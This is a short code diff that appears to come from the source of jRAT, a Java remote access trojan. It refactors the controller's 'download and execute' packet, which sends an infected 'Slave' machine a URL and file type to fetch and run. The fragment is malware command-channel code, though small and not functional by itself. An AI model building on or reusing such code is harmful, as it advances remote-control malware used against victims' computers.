@@ -2,7 +2,6 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-import java.io.DataOutputStream;
 import java.io.File;
 
 
@@ -24,10 +23,10 @@ public class Packet17DownloadExecute extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(Slave slave, DataOutputStream dos) throws Exception {
+	public void write(Slave slave) throws Exception {
 		slave.writeLine(url);
 		slave.writeLine(filetype);
-		dos.writeBoolean(fromLocal);
+		slave.writeBoolean(fromLocal);
 	}
 
 	@Override
